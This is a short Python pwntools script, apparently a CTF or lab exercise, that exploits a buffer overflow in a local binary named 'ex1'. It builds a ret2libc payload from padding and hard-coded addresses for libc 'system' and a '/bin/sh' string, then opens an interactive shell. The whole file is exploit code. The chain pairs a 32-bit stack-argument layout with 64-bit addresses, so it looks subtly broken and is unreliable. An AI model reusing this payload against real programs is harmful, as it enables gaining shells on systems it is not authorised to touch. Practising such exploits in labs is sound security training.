from pwn import *

target = process("./bin/ex1")

libc_base = 0x7ffff7da5000
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f
padding = 336

payload = b"A" * padding      
payload += p64(system)          
payload += p64(0x0)      
payload += p64(binsh)           

# target.sendline("1")
target.sendline(payload)
target.interactive()